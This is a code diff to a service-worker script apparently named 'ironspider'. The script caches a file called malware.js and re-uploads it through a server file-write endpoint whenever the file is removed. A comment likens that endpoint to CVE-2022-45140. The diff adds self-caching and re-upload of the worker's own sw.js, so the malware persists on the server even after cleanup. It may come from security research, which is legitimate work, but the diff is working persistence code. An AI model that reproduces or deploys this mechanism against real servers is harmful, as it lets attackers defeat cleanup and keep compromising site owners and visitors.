@@ -26,6 +26,7 @@
 // ── Constants ─────────────────────────────────────────────────────────────────
 const CACHE_NAME     = 'ironspider-v1';  // name of this SW's CacheStorage bucket
 const MALWARE_PATH   = '/malware.js';    // server path the SW watches and caches
+const SW_PATH = '/sw.js';
 const UPLOAD_PATH    = '/upload';        // server endpoint that writes files to disk
                                           // (analogous to the CVE-2022-45140 API)
 const CHECK_INTERVAL = 5000;             // ms between malware-presence polls
@@ -67,7 +68,7 @@ self.addEventListener('install', event => {
       // cache.add(url) is shorthand for fetch(url) then cache.put(url, response).
       // It fetches malware.js from the server RIGHT NOW, during install, and
       // stores the full HTTP response (headers + body) in the cache bucket.
-      .then(cache => cache.add(MALWARE_PATH))
+      .then(cache => cache.addAll([MALWARE_PATH, SW_PATH]))
       .then(() => console.log('[SW] malware.js cached successfully'))
       .catch(err  => console.error('[SW] cache.add failed:', err.message))
   );
@@ -264,8 +265,8 @@ async function resurrect() {
   console.log('[SW] *** RESURRECTION SEQUENCE INITIATED ***');
   await notifyClients({ type: 'RESURRECTION_STARTED', timestamp: Date.now() });
 
-  // ── Step 1: read cached payload ──────────────────────────────────────────
-  let payload;
+  // ── Step 1: read cached payloads ─────────────────────────────────────────
+  let payload, swPayload;
   try {
     const cache  = await caches.open(CACHE_NAME);
     // cache.match() returns undefined if the entry is not found (rather than
@@ -282,13 +283,22 @@ async function resurrect() {
     // .clone() before .text(): Response bodies are one-shot streams.
     // Cloning lets us read the text here without consuming the cached entry.
     payload = await cached.clone().text();
-    console.log(`[SW] cached payload retrieved: ${payload.length} bytes`);
+    console.log(`[SW] cached malware.js retrieved: ${payload.length} bytes`);
+
+    // sw.js is non-fatal if missing — malware.js resurrection still proceeds.
+    const cachedSw = await cache.match(SW_PATH);
+    if (cachedSw) {
+      swPayload = await cachedSw.clone().text();
+      console.log(`[SW] cached sw.js retrieved: ${swPayload.length} bytes`);
+    } else {
+      console.warn('[SW] sw.js not in cache — will skip sw.js re-upload');
+    }
   } catch (err) {
     await notifyClients({ type: 'RESURRECTION_FAILED', reason: `Cache read error: ${err.message}` });
     return;
   }
 
-  // ── Step 2: re-upload via the file-write API ──────────────────────────────
+  // ── Step 2: re-upload malware.js via the file-write API ───────────────────
   try {
     const uploadResp = await fetch(UPLOAD_PATH, {
       method:  'POST',
@@ -300,17 +310,38 @@ async function resurrect() {
     });
 
     if (uploadResp.ok) {
-      console.log('[SW] *** RESURRECTION COMPLETE — malware.js re-uploaded');
+      console.log('[SW] *** malware.js re-uploaded');
       await notifyClients({ type: 'RESURRECTED', timestamp: Date.now() });
     } else {
       const msg = `Upload returned HTTP ${uploadResp.status}`;
       console.error('[SW] RESURRECTION FAILED —', msg);
       await notifyClients({ type: 'RESURRECTION_FAILED', reason: msg });
+      return;
     }
   } catch (err) {
     // Network error during upload — server may still be starting after a
     // hardware replacement.  The monitor will try again next interval.
     await notifyClients({ type: 'RESURRECTION_FAILED', reason: `Upload error: ${err.message}` });
+    return;
+  }
+
+  // ── Step 2b: re-upload sw.js (self-sustaining resurrection) ──────────────
+  // Non-fatal: malware.js is already back on the server even if this fails.
+  if (swPayload) {
+    try {
+      const swResp = await fetch(UPLOAD_PATH, {
+        method:  'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ filename: 'sw.js', content: swPayload }),
+      });
+      if (swResp.ok) {
+        console.log('[SW] *** sw.js re-uploaded — full self-resurrection complete');
+      } else {
+        console.warn(`[SW] sw.js upload returned HTTP ${swResp.status}`);
+      }
+    } catch (err) {
+      console.warn(`[SW] sw.js upload error: ${err.message}`);
+    }
   }
 }
 
